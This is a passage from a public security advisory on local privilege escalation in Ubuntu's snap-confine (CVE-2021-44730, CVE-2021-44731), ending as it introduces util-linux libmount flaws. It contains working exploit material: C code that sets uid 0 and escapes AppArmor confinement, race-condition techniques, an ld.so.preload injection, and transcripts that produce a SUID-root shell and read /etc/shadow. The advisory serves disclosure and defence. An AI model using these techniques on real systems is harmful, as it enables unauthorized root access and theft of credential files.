This second attempt also failed, because snap-confine's AppArmor profile
denied the execution of our snap-discard-ns program in /tmp:

------------------------------------------------------------------------
# dmesg | tail -n 1
[16732.767948] audit: type=3D1400 audit(1635093756.584:30): apparmor=3D"DEN=
IED" operation=3D"exec" profile=3D"/usr/lib/snapd/snap-confine" name=3D"/tm=
p/.tmp/snap-discard-ns" pid=3D1777 comm=3D"snap-confine" requested_mask=3D"=
x" denied_mask=3D"x" fsuid=3D0 ouid=3D1001
------------------------------------------------------------------------

________________________________________________________________________

Third, failed attempt
________________________________________________________________________

To solve this second problem, we reviewed snap-confine's AppArmor
profile (in /etc/apparmor.d/usr.lib.snapd.snap-confine.real) and noticed
that it allows the execution of programs in ~/.Private:

    @{HOME}/.Private/** mrixwlk,

We therefore move our /tmp/.tmp directory to ~/.Private, and make
another attempt:

------------------------------------------------------------------------
$ mkdir -m 0700 ~/.Private
$ cd ~/.Private
$ mv -i /tmp/.tmp ./
$ cd .tmp

$ env -i SNAPD_DEBUG=3D1 SNAP_INSTANCE_NAME=3Dlxd aa-exec -p /usr/lib/snapd=
/snap-confine -- ./snap-confine --base snapd snap.lxd.daemon /nonexistent
...
snap-discard-ns failed with code 10
------------------------------------------------------------------------

This third attempt succeeded in executing our snap-discard-ns program,
but failed to subsequently execute /bin/bash (again because of
snap-confine's AppArmor profile):

------------------------------------------------------------------------
# dmesg | tail -n 1
[16991.232201] audit: type=3D1400 audit(1635094015.048:31): apparmor=3D"DEN=
IED" operation=3D"exec" profile=3D"/usr/lib/snapd/snap-confine" name=3D"/us=
r/bin/bash" pid=3D1789 comm=3D"6" requested_mask=3D"x" denied_mask=3D"x" fs=
uid=3D0 ouid=3D0
------------------------------------------------------------------------

________________________________________________________________________

Fourth, partially successful attempt
________________________________________________________________________

To solve this third problem, we noticed that snap-confine's AppArmor
profile allows the transition to AppArmor profiles that are not
"unconfined" and that do not start with '/':

    change_profile unsafe /** -> [^u/]**,

and we also noticed that one of the "lxd" snap's AppArmor profiles
("snap.lxd.daemon" in /var/lib/snapd/apparmor/profiles/snap.lxd.daemon)
is more permissive than snap-confine's profile. We therefore modify our
snap-discard-ns program, to transition to the "snap.lxd.daemon" profile
when executing /bin/bash (by writing "exec snap.lxd.daemon" to the file
/proc/self/attr/exec, which is what "aa-exec -p snap.lxd.daemon" does):

------------------------------------------------------------------------
$ cat > snap-discard-ns.c << "EOF"
#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>

int main(void) {
    if (setuid(0)) _exit(__LINE__);
    if (setgid(0)) _exit(__LINE__);

    FILE * const fp =3D fopen("/proc/self/attr/exec", "w");
    if (!fp) _exit(__LINE__);
    if (fputs("exec snap.lxd.daemon", fp) < 0) _exit(__LINE__);
    if (fclose(fp)) _exit(__LINE__);

    char * const argv[] =3D { "/bin/bash", "-c", "id; cat /proc/self/attr/c=
urrent", NULL };
    execve(*argv, argv, NULL);
    _exit(__LINE__);
}
EOF
$ gcc -o snap-discard-ns snap-discard-ns.c

$ env -i SNAPD_DEBUG=3D1 SNAP_INSTANCE_NAME=3Dlxd aa-exec -p /usr/lib/snapd=
/snap-confine -- ./snap-confine --base snapd snap.lxd.daemon /nonexistent
...
uid=3D0(root) gid=3D0(root) groups=3D0(root),1001(jane)
snap.lxd.daemon (enforce)
...
------------------------------------------------------------------------

This fourth attempt succeeded in executing /bin/bash and id, but this
root shell is still confined ("snap.lxd.daemon (enforce)") and we would
rather obtain an unconfined root shell.

________________________________________________________________________

Fifth, successful attempt
________________________________________________________________________

To solve this fourth and last problem, we noticed that the AppArmor
profile "snap.lxd.daemon" allows the unconfined execution of aa-exec:

    /{,usr/}{,s}bin/aa-exec ux,

We therefore modify our snap-discard-ns program, to wrap the execution
of our shell commands in "aa-exec -p unconfined":

------------------------------------------------------------------------
$ cat > snap-discard-ns.c << "EOF"
#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>

int main(void) {
    if (setuid(0)) _exit(__LINE__);
    if (setgid(0)) _exit(__LINE__);

    FILE * const fp =3D fopen("/proc/self/attr/exec", "w");
    if (!fp) _exit(__LINE__);
    if (fputs("exec snap.lxd.daemon", fp) < 0) _exit(__LINE__);
    if (fclose(fp)) _exit(__LINE__);

    char * const argv[] =3D { "/bin/bash", "-c", "exec aa-exec -p unconfine=
d -- "
        "/bin/bash -c 'id; cat /proc/self/attr/current'", NULL };
    execve(*argv, argv, NULL);
    _exit(__LINE__);
}
EOF
$ gcc -o snap-discard-ns snap-discard-ns.c

$ env -i SNAPD_DEBUG=3D1 SNAP_INSTANCE_NAME=3Dlxd aa-exec -p /usr/lib/snapd=
/snap-confine -- ./snap-confine --base snapd snap.lxd.daemon /nonexistent
...
uid=3D0(root) gid=3D0(root) groups=3D0(root),1001(jane)
unconfined
...
------------------------------------------------------------------------

Finally, this fifth attempt successfully executed an unconfined root
shell.

Although we consider this attack impractical (because the sysctl
fs.protected_hardlinks is 1 by default), it gave us the idea that
eventually allowed us to exploit snap-confine in a default installation:
what if we were able to create a copy of the SUID-root snap-confine in a
writable directory like /tmp, but without creating a hardlink? We were
particularly curious about bind-mounts, because snap-confine makes
extensive use of bind-mounts to set up its sandboxes.



=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
CVE-2021-44731: Race condition in snap-confine's setup_private_mount()
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

    It's all a matter of timing
        -- Oh No! More Lemmings, Havoc Level 12

To set up a snap's sandbox (more precisely, its mount namespace),
snap-confine's function setup_private_mount() creates a temporary
directory /tmp/snap.$SNAP_NAME/tmp (for example, /tmp/snap.lxd/tmp) --
or reuses it if it already exists -- and bind-mounts it onto the /tmp
directory inside the snap's mount namespace. setup_private_mount() is
programmed very defensively (f*() and *at() syscalls, O_DIRECTORY and
O_NOFOLLOW flags) to avoid race conditions:

------------------------------------------------------------------------
 56 static void setup_private_mount(const char *snap_name)
 57 {
 ..
 83         sc_must_snprintf(base_dir, sizeof(base_dir), "/tmp/snap.%s", sn=
ap_name);
 84         sc_must_snprintf(tmp_dir, sizeof(tmp_dir), "%s/tmp", base_dir);
 ..
 91         if (mkdir(base_dir, 0700) < 0 && errno !=3D EEXIST) {
 ..
 94         base_dir_fd =3D open(base_dir,
 95                            O_RDONLY | O_DIRECTORY | O_CLOEXEC | O_NOFOL=
LOW);
...
106         if (fchmod(base_dir_fd, 0700) < 0) {
...
109         if (fchown(base_dir_fd, 0, 0) < 0) {
...
114         if (mkdirat(base_dir_fd, "tmp", 01777) < 0 && errno !=3D EEXIST=
) {
...
118         tmp_dir_fd =3D openat(base_dir_fd, "tmp",
119                             O_RDONLY | O_DIRECTORY | O_CLOEXEC | O_NOFO=
LLOW);
...
123         if (fchmod(tmp_dir_fd, 01777) < 0) {
...
127         if (fchown(tmp_dir_fd, 0, 0) < 0) {
...
131         sc_do_mount(tmp_dir, "/tmp", NULL, MS_BIND, NULL);
132         sc_do_mount("none", "/tmp", NULL, MS_PRIVATE, NULL);
133 }
------------------------------------------------------------------------

Unfortunately, this function is vulnerable to a race condition, because
the line 131 passes an absolute path (/tmp/snap.lxd/tmp) to the mount()
syscall, which does follow symlinks:

- we create the directory /tmp/snap.lxd, before we execute snap-confine;

- after the open() at line 94 but before the fchown() at line 109, we
  replace /tmp/snap.lxd with another directory that contains a symlink
  named "tmp" (which therefore becomes /tmp/snap.lxd/tmp) that points to
  an arbitrary directory;

- as a result, because the mount() at line 131 follows symlinks, we
  trick snap-confine into bind-mounting an arbitrary directory onto /tmp
  inside the snap's mount namespace.

This race condition opens up a world of possibilities: inside the snap's
mount namespace (which we can enter through snap-confine itself), we can
bind-mount a world-writable, non-sticky directory onto /tmp, or we can
bind-mount any other part of the filesystem onto /tmp. We will exploit
this powerful primitive in the two following case studies.

Note: we can reliably win this race condition, by monitoring
/tmp/snap.lxd with inotify, by pinning our exploit and snap-confine to
the same CPU with sched_setaffinity(), and by lowering snap-confine's
scheduling priority with setpriority() and sched_setscheduler().



=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Case study: Ubuntu Server, near-default installation
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

    Not as complicated as it looks
        -- Lemmings, Fun Level 8

In this first case study, we exploit a default installation of Ubuntu
Server, plus one of the "Featured Server Snaps" that are offered during
the installation; we abuse the snap "heroku" here, but other snaps can
be abused instead (for example, "microk8s").

Our main idea is to exploit CVE-2021-44731, bind-mount the directory
/usr/lib/snapd (which contains snap-confine) onto /tmp inside the snap's
mount namespace, and reproduce our exploit for CVE-2021-44730 (without a
hardlink): we execute /tmp/snap-confine (inside the snap's mount
namespace), and force it to execute our own /tmp/snap-discard-ns
program, as root.

In theory, this seems impossible: if we bind-mount /usr/lib/snapd onto
/tmp, then /tmp/snap-discard-ns will always be the real snap-discard-ns,
not our own program. In practice, when snap-confine is executed inside a
mount namespace, it first calls sc_reassociate_with_pid1_mount_ns(),
which enters init's mount namespace, where /tmp is not bind-mounted:
snap-confine executes /tmp/snap-discard-ns outside the snap's mount
namespace, where we can create our own programs in /tmp.

________________________________________________________________________

First, failed attempt
________________________________________________________________________

In this first version of our exploit, we create an empty directory
/tmp/snap.heroku and a directory /tmp/snap.XXXXXX that contains a "tmp"
symlink to /usr/lib/snapd, and we exchange these two directories at the
right time, to bind-mount /usr/lib/snapd onto /tmp inside heroku's mount
namespace. The command we execute is "/usr/lib/snapd/snap-confine --base
core snap.heroku.heroku /bin/bash -c 'sleep 10; /tmp/snap-confine --base
snapd snap.heroku.heroku /nonexistent'".

Note: if the "core" base is not installed, we can use the "core18" base
instead, but then we must bind-mount /snap/snapd/current/usr/lib/snapd
instead of /usr/lib/snapd (for glibc compatibility reasons).

------------------------------------------------------------------------
$ id
uid=3D65534(nobody) gid=3D65534(nogroup) groups=3D65534(nogroup)

$ cd /tmp
$ cp -i "$(which true)" snap-update-ns
$ gcc -o snap-discard-ns snap-discard-ns.c

$ gcc -o CVE-2021-44731-Server1 CVE-2021-44731-Server1.c
$ ./CVE-2021-44731-Server1
...
DEBUG: apparmor label on snap-confine is: /usr/lib/snapd/snap-confine
DEBUG: apparmor mode is: enforce
...
cannot chmod base directory /tmp/snap.heroku to 0700: Operation not permitt=
ed
------------------------------------------------------------------------

This first attempt failed, because snap-confine's AppArmor profile
prevented setup_private_mount() from fchmod()ing our /tmp/snap.heroku
directory (at line 106):

------------------------------------------------------------------------
# dmesg | tail -n 1
[26963.479502] audit: type=3D1400 audit(1635180724.155:37): apparmor=3D"DEN=
IED" operation=3D"capable" profile=3D"/usr/lib/snapd/snap-confine" pid=3D17=
12 comm=3D"snap-confine" capability=3D3  capname=3D"fowner"
------------------------------------------------------------------------

________________________________________________________________________

Second, failed attempt
________________________________________________________________________

To solve this first, seemingly insurmountable problem, we tried out a
Crazy! Wild! Wicked! idea -- to execute snap-confine in "unconfined"
mode, by wrapping it in "aa-exec -p unconfined":

------------------------------------------------------------------------
$ gcc -o CVE-2021-44731-Server2 CVE-2021-44731-Server2.c
$ ./CVE-2021-44731-Server2
...
DEBUG: apparmor label on snap-confine is: unconfined
DEBUG: apparmor mode is: (null)
snap-confine has elevated permissions and is not confined but should be. Re=
fusing to continue to avoid permission escalation attacks
------------------------------------------------------------------------

Incredibly, this idea worked out; however, snap-confine's defensive
programming detected this unconfined execution and called exit().

________________________________________________________________________

Third, successful attempt
________________________________________________________________________

Since snap-confine refuses to run unconfined, but accepts AppArmor
profiles other than the intended "/usr/lib/snapd/snap-confine" profile,
we reviewed all AppArmor profiles and noticed that some of them are in
"complain" mode (for example, "snap.heroku.heroku"):

------------------------------------------------------------------------
# aa-status
apparmor module is loaded.
35 profiles are loaded.
33 profiles are in enforce mode.
   ...
2 profiles are in complain mode.
   snap.heroku.heroku
   ...
------------------------------------------------------------------------

These "complain" profiles log policy violations but allow the offending
program to continue its execution (unlike "kill" or "enforce" profiles);
we therefore try to wrap snap-confine in "aa-exec -p snap.heroku.heroku"
to bypass AppArmor:

------------------------------------------------------------------------
$ gcc -o CVE-2021-44731-Server3 CVE-2021-44731-Server3.c
$ ./CVE-2021-44731-Server3
...
DEBUG: apparmor label on snap-confine is: snap.heroku.heroku
DEBUG: apparmor mode is: complain
...
DEBUG: execv(/bin/bash, /bin/bash...)
DEBUG:  argv[1] =3D -c
DEBUG:  argv[2] =3D sleep 10; /tmp/snap-confine --base snapd snap.heroku.he=
roku /nonexistent
...
DEBUG: moving to mount namespace of pid 1
...
DEBUG: calling snapd tool snap-discard-ns
...
uid=3D0(root) gid=3D0(root) groups=3D0(root),65534(nogroup)
snap.heroku.heroku (complain)
...
------------------------------------------------------------------------

This third attempt successfully executed a root shell that is
effectively unconfined ("snap.heroku.heroku (complain)").

Side note: we tried and failed to exploit CVE-2021-44731 in a default
installation of Ubuntu Server (i.e., without an extra snap like "heroku"
or "microk8s"); we faced two problems:

- The "lxd" snap (the only snap installed by default on Ubuntu Server)
  is started automatically at boot time by snapd; this prevents us from
  creating /tmp/snap.lxd ourselves. The solution to this first problem
  is surprisingly easy, because the cron daemon is started before snapd
  at boot time: we can add an "@reboot touch /tmp/snap.lxd" command to
  our user's crontab and take ownership of this directory before snapd
  (on the next reboot).

- No AppArmor profiles are in "complain" mode by default; this prevents
  us from bypassing AppArmor (the fchmod() at line 106). Interestingly,
  the check that prevents snap-confine from running unconfined is very
  fragile (a fail-open check): if aa_is_enabled() fails (if it returns
  false), then snap-confine assumes that AppArmor is disabled, and
  allows us to run it unconfined.

  Internally, aa_is_enabled() calls the glibc's setmntent() (fopen()),
  getmntent() (malloc() and fgets()), and endmntent(); for example, if
  we set a low RLIMIT_NOFILE resource limit, then this fopen() fails,
  and snap-confine continues to run unconfined:

------------------------------------------------------------------------
$ env -i SNAPD_DEBUG=3D1 SNAP_INSTANCE_NAME=3Dlxd prlimit --nofile=3D4 aa-e=
xec -p unconfined -- /usr/lib/snapd/snap-confine --base core18 snap.lxd.dae=
mon /nonexistent
...
DEBUG: apparmor is not enabled: Too many open files
cannot open path /proc/1/ns/mnt: Too many open files
------------------------------------------------------------------------

  However, this RLIMIT_NOFILE resource limit is so low that subsequent
  open()s also fail and prevent snap-confine from running normally. We
  also tried to reach the system-wide limit on open files (fs.file-max)
  but failed, because systemd increases this limit to LONG_MAX (since
  version 240). We also tried to cause a failure in setmntent() or
  getmntent() by lowering the RLIMIT_DATA resource limit, but also
  failed.

  If you, dear reader, find a solution to this second problem, please
  post it to the public oss-security mailing list!



=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Case study: Ubuntu Desktop, default installation
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

    If at first you don't succeed..
        -- Lemmings, Taxing Level 1

To exploit CVE-2021-44731 in a default installation of Ubuntu Desktop,
we execute snap-confine with the "snap-store" snap (the only snap that
is installed by default) and we bypass AppArmor with one of the default
"complain" profiles (for example, "libreoffice-soffice").

Still, inside its sandbox, snap-confine applies one of snap-store's
"enforce" profiles (for example, "snap.snap-store.snap-store"), which
prevents us from successfully executing /tmp/snap-confine and therefore
prevents us from reusing our Ubuntu-Server exploitation technique:

------------------------------------------------------------------------
$ gcc -o CVE-2021-44731-Desktop0 CVE-2021-44731-Desktop0.c
$ ./CVE-2021-44731-Desktop0
...
DEBUG: apparmor label on snap-confine is: libreoffice-soffice
DEBUG: apparmor mode is: complain
...
DEBUG: execv(/bin/bash, /bin/bash...)
DEBUG:  argv[1] =3D -c
DEBUG:  argv[2] =3D sleep 10; /tmp/snap-confine --base snapd snap.snap-stor=
e.snap-store /nonexistent
...
DEBUG: apparmor is available but the interface but the interface is not ava=
ilable
cannot read mount namespace identifier of pid 1: Permission denied
------------------------------------------------------------------------

Belatedly, we realized that the setup of snap-store's mount namespace is
extremely complicated; indeed, snap-confine executes the helper program
snap-update-ns twice:

- a first time, to set up the "system" bind-mounts listed in
  /var/lib/snapd/mount/snap.snap-store.fstab;

- a second time, to set up the "user" bind-mounts listed in
  /var/lib/snapd/mount/snap.snap-store.user-fstab.

Among those system bind-mounts, one in particular caught our attention:

  /var/lib/snapd/hostfs/var/lib/app-info /var/lib/app-info none bind,ro 0 0

To set up this bind-mount, snap-update-ns must first create the
directory /var/lib/app-info; but inside snap-store's mount namespace,
/var/lib is in a read-only filesystem (the "core18" base's squashfs).
Consequently, snap-update-ns must first create a "mimic" -- a writable
copy of /var/lib:

1/ it bind-mounts /var/lib onto /tmp/.snap/var/lib (inside snap-store's
mount namespace);

2/ it mounts a tmpfs onto /var/lib;

3/ it bind-mounts every directory entry from /tmp/.snap/var/lib back
into /var/lib;

4/ it creates the directory /var/lib/app-info (which is in a writable
tmpfs now);

5/ it bind-mounts /var/lib/snapd/hostfs/var/lib/app-info onto
/var/lib/app-info.

Unfortunately, because we own /tmp inside snap-store's mount namespace
(thanks to CVE-2021-44731), we can race against snap-update-ns between
1/ and 3/ and replace /tmp/.snap/var/lib -- and hence /var/lib -- with
our own directory tree.

Note: we can reliably win this race condition by "single-stepping"
snap-confine (we execute it with SNAPD_DEBUG=3D1, we redirect its stderr
to an AF_UNIX socket with minimized SO_RCVBUF and SO_SNDBUF, we read()
its output byte by byte, and we MSG_PEEK at its buffered output).

This race condition allows us to replace
/var/lib/snapd/mount/snap.snap-store.user-fstab with our own fstab file,
which allows us to set up near-arbitrary bind-mounts inside snap-store's
mount namespace. These bind-mounts are not completely arbitrary, because
they are restricted by the "snap-update-ns.snap-store" AppArmor profile,
whose most interesting rules are:

------------------------------------------------------------------------
 170   mount options=3D(rbind, rw) /tmp/.snap/*/ -> /*/,
 ...
 762   mount options=3D(rbind, rw) /tmp/.snap/var/lib/*/ -> /var/lib/*/,
------------------------------------------------------------------------

Our action plan, then, is:

- we create a copy of /etc (minus the unreadable files like /etc/shadow)
  into /tmp/.tmp/.snap/etc (which will become /tmp/.snap/etc inside
  snap-store's mount namespace);

- we create a file /tmp/.tmp/.snap/etc/ld.so.preload (which contains the
  library name "/tmp/librootshell.so"), and we create a shared library
  /tmp/.tmp/librootshell.so (which will become /tmp/librootshell.so
  inside snap-store's mount namespace);

- we bind-mount our /tmp/.tmp onto /tmp (inside snap-store's mount
  namespace) by exploiting CVE-2021-44731 (note: /tmp/snap.snap-store
  does not normally exist, but if it does, we can use our "@reboot"
  crontab trick to create it ourselves on the next reboot);

- we bind-mount the contents of /tmp/.tmp/.snap/var/lib into /var/lib
  (inside snap-store's mount namespace) by exploiting the race condition
  between 1/ and 3/ in snap-update-ns;

- we add the following bind-mount line to our
  /tmp/.tmp/.snap/var/lib/snapd/mount/snap.snap-store.user-fstab (which
  is effectively /var/lib/snapd/mount/snap.snap-store.user-fstab inside
  snap-store's mount namespace):

  /tmp/.snap/etc /etc none rbind,rw 0 0

- we execute snap-confine (outside snap-store's mount namespace), which
  reads our user-fstab file and bind-mounts our copy of /etc (inside
  snap-store's mount namespace) -- this bind-mount is allowed by the
  line 170 of the "snap-update-ns.snap-store" AppArmor profile;

- we execute the SUID-root program /usr/lib/snapd/snap-confine (inside
  snap-store's mount namespace), which reads our /etc/ld.so.preload and
  therefore executes our shared library /tmp/librootshell.so, as root --
  these two operations are allowed by the "snap.snap-store.snap-store"
  AppArmor profile:

------------------------------------------------------------------------
  34   /etc/ld.so.preload r,
 ...
 299   /tmp/** mrwlkix,
------------------------------------------------------------------------

________________________________________________________________________

First, failed attempt
________________________________________________________________________

Our first attempt succeeded in bind-mounting our own /etc but failed to
execute a SUID-root program inside snap-store's mount namespace. Indeed,
snap-confine's defensive programming detected that /var/lib/snapd does
not belong to root (it belongs to us, inside snap-store's mount
namespace), and called exit() (via validate_bpfpath_is_safe()):

------------------------------------------------------------------------
$ id
uid=3D1001(jane) gid=3D1001(jane) groups=3D1001(jane)

$ gcc -o CVE-2021-44731-Desktop CVE-2021-44731-Desktop.c
$ ./CVE-2021-44731-Desktop
...
change.go:316: DEBUG: mount name:"/tmp/.snap/var/lib/snapd" dir:"/var/lib/s=
napd" type:"" opts:MS_BIND|MS_REC unparsed:"" (error: <nil>)
...

$ cp -a /etc /tmp/.tmp/.snap
$ echo /tmp/librootshell.so > /tmp/.tmp/.snap/etc/ld.so.preload
$ gcc -fpic -shared -o /tmp/.tmp/librootshell.so librootshell.c
$ mkdir /tmp/.tmp/.snap/var/lib/snapd/mount
$ echo '/tmp/.snap/etc /etc none rbind,rw 0 0' > /tmp/.tmp/.snap/var/lib/sn=
apd/mount/snap.snap-store.user-fstab

$ env -i SNAPD_DEBUG=3D1 SNAP_INSTANCE_NAME=3Dsnap-store /usr/lib/snapd/sna=
p-confine --base core18 snap.snap-store.snap-store /usr/lib/snapd/snap-conf=
ine
...
change.go:316: DEBUG: mount name:"/tmp/.snap/etc" dir:"/etc" type:"none" op=
ts:MS_BIND|MS_REC unparsed:"" (error: <nil>)
...
DEBUG: loading bpf program for security tag snap.snap-store.snap-store
/var/lib/snapd not root-owned 1001:1001
------------------------------------------------------------------------

________________________________________________________________________

Second, successful attempt
________________________________________________________________________

The solution to this problem is easy; because the original, root-owned
bind-mount of /var/lib still exists inside snap-store's mount namespace
(we merely renamed it, during the race condition between 1/ and 3/), we
can simply rename it back to /tmp/.snap/var/lib, and add the following
bind-mount line to our user-fstab file:

  /tmp/.snap/var/lib/snapd /var/lib/snapd none rbind,rw 0 0

This bind-mount is allowed by the line 762 of the
"snap-update-ns.snap-store" AppArmor profile, and allows us to change
the ownership of /var/lib/snapd back to root, and to execute a SUID-root
program inside snap-store's mount namespace (and hence our own shared
library, as root):

------------------------------------------------------------------------
$ echo '/tmp/.snap/var/lib/snapd /var/lib/snapd none rbind,rw 0 0' >> /tmp/=
.tmp/.snap/var/lib/snapd/mount/snap.snap-store.user-fstab
$ mv -i /tmp/.tmp/.snap/var/lib /tmp/.tmp/.snap/var/lib.exchange2
$ mv -i /tmp/.tmp/.snap/var/lib.exchange /tmp/.tmp/.snap/var/lib

$ env -i SNAPD_DEBUG=3D1 SNAP_INSTANCE_NAME=3Dsnap-store /usr/lib/snapd/sna=
p-confine --base core18 snap.snap-store.snap-store /usr/lib/snapd/snap-conf=
ine
...
change.go:316: DEBUG: mount name:"/tmp/.snap/etc" dir:"/etc" type:"none" op=
ts:MS_BIND|MS_REC unparsed:"" (error: <nil>)
change.go:316: DEBUG: mount name:"/tmp/.snap/var/lib/snapd" dir:"/var/lib/s=
napd" type:"none" opts:MS_BIND|MS_REC unparsed:"" (error: <nil>)
...
DEBUG: loading bpf program for security tag snap.snap-store.snap-store
DEBUG: read 6392 bytes from /var/lib/snapd/seccomp/bpf//snap.snap-store.sna=
p-store.bin
...
DEBUG: execv(/usr/lib/snapd/snap-confine, /usr/lib/snapd/snap-confine...)
...
------------------------------------------------------------------------

This second attempt succeeded; our shared library created a SUID-root
shell /tmp/sh that is reachable outside snap-store's mount namespace via
/tmp/.tmp/sh:

------------------------------------------------------------------------
$ /tmp/.tmp/sh -p
# id
uid=3D1001(jane) gid=3D1001(jane) euid=3D0(root) groups=3D1001(jane)
                              ^^^^^^^^^^^^
# wc /etc/shadow
  49   49 1617 /etc/shadow
------------------------------------------------------------------------



=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Prologue: CVE-2021-3996 and CVE-2021-3995 in util-linux's libmount
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

    Get a little extra help
        -- Oh No! More Lemmings, Tame Level 14

During our work on snap-confine, we explored many different avenues of
attack; most of them were dead ends, but some of them led us to the
discovery of vulnerabilities in related packages and libraries. For
example, we pondered over the beginning of snap-confine's function
sc_bootstrap_mount_namespace() for a long time:

------------------------------------------------------------------------
223         char scratch_dir[] =3D "/tmp/snap.rootfs_XXXXXX";
...
226         if (mkdtemp(scratch_dir) =3D=3D NULL) {
...
234         sc_do_mount("none", "/", NULL, MS_REC | MS_SHARED, NULL);
...
238         sc_do_mount(scratch_dir, scratch_dir, NULL, MS_BIND, NULL);
...
245         sc_do_mount("none", scratch_dir, NULL, MS_UNBINDABLE, NULL);
...
254         sc_do_mount(config->rootfs_dir, scratch_dir, NULL, MS_REC | MS_=
BIND,
255                     NULL);
------------------------------------------------------------------------

This function is called after unshare(CLONE_NEWNS) to set up the root
filesystem inside a snap's mount namespace:

- at lines 223-226, it creates a random, temporary scratch directory
  /tmp/snap.rootfs_XXXXXX (as root, with permissions 0700) that will
  become the snap's root filesystem;

- at lines 238-245, it bind-mounts this scratch directory onto itself,
  and makes it unbindable and private (i.e., subsequent mounts inside
  this directory will not be visible outside the snap's mount
  namespace);

- at lines 254-255, it bind-mounts the snap's root filesystem onto this
  scratch directory (for example, /snap/snapd/current, a read-only
  squashfs that contains a copy of the SUID-root snap-confine).

Our half-baked idea was: what if we were able to unmount the scratch
directory's private bind-mount, after line 245 but before line 254? The
bind-mount of the snap's root filesystem (at lines 254-255) would not be
private anymore, and would therefore be visible outside the snap's mount
namespace. In other words, we would be able to execute snap-confine via
/tmp/snap.rootfs_XXXXXX/usr/lib/snapd/snap-confine, which reminded us
strongly of our exploit for CVE-2021-44730 (but without a hardlink).

Consequently, we audited the SUID-root programs umount and fusermount
for ways to unmount a filesystem that does not belong to us, and we
discovered CVE-2021-3996 and CVE-2021-3995 in util-linux's libmount
(which is used internally by umount).

Note: CVE-2021-3996 and CVE-2021-3995 were both introduced by commit
5fea669 ("libmount: Support unmount FUSE mounts") in November 2018.



=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
CVE-2021-3996: Unauthorized unmount in util-linux's libmount
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

In order for an unprivileged user to unmount a FUSE filesystem with
umount, this filesystem must a/ be listed in /proc/self/mountinfo, and
b/ be a FUSE filesystem (lines 466-470), and c/ belong to the current,
unprivileged user (lines 477-498):

------------------------------------------------------------------------
 451 static int is_fuse_usermount(struct libmnt_context *cxt, int *errsv)
 452 {
 ...
 466         if (strcmp(type, "fuse") !=3D 0 &&
 467             strcmp(type, "fuseblk") !=3D 0 &&
 468             strncmp(type, "fuse.", 5) !=3D 0 &&
